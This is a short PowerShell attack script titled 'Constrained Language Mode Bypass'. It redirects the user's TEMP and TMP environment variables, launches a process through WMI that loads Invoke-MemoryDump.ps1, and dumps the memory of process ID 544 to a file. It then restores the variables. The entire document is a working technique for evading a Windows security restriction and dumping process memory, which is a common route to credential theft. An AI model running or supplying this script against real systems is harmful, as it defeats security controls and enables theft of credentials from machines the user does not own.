# Constrained Language Mode Bypass
$command = @"
powershell -c "iex (cat c:\users\public\documents\Invoke-MemoryDump.ps1 | out-string); Invoke-MemoryDump -ProcID 544 -OutputPath 'C:\users\public\documents\out.dmp'"
"@

$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList $command
sleep 5

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
